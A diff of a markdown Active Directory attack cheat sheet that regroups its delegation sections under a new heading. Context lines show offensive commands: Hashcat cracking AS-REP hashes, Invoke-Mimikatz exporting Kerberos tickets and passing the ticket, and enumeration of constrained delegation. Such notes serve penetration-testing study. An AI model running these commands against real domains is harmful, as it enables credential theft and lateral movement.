@@ -3,8 +3,9 @@
   * [Set SPN](#Set-SPN)
 * [AS-REP Roasting](#AS-REP-Roasting) 
 * [Set SPN](#Set-SPN) 
-* [Unconstrained Delegation](#Unconstrained-delegation) 
-* [Constrained Delegation](#Constrained-delegation) 
+* [Delegation](#Delegation) 
+  * [Unconstrained Delegation](#Unconstrained-delegation) 
+  * [Constrained Delegation](#Constrained-delegation) 
 * [DNS Admins](#DNS-Admins) 
 * [Enterprise Admins](#Enterprise-Admins) 
   * [Child to parent - Trust tickets](#Child-to-parent---Trust-tickets)
@@ -151,8 +152,8 @@ Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......
 ```
 Hashcat -a 0 -m 18200 hash.txt rockyou.txt
 ```
-
-## Unconstrained Delegation
+## Delegation
+### Unconstrained Delegation
 #### Discover domain computers which have unconstrained delegation
 Domain Controllers always show up, ignore them
 ```
@@ -177,8 +178,7 @@ Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
 ```
 
-## Constrained Delegation
-### Enumerate
+### Constrained Delegation
 #### Enumerate users with contrained delegation enabled
 ```
 Get-DomainUser -TrustedToAuth
